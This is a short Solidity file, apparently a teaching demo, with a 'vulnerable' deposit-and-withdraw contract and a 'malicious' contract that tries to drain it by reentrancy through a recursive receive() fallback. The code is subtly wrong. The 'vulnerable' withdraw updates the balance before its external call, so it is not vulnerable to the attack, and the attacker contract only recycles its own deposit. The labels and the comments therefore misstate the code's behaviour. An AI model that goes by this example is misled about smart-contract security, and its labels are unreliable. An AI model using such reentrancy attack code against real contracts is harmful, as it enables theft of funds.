// Vulnerable contract
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        balances[msg.sender] -= amount;
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// Malicious contract
pragma solidity ^0.8.0;

contract MaliciousContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
    }

    function attack() public payable {
        // Deposit some Ether into the vulnerable contract
        vulnerableContract.deposit{value: msg.value}();

        // Call the vulnerable contract's withdraw function
        vulnerableContract.withdraw(msg.value);
    }

    receive() external payable {
        // Malicious contract fallback function
        // Reentrancy attack: Call the attack function again
        attack();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
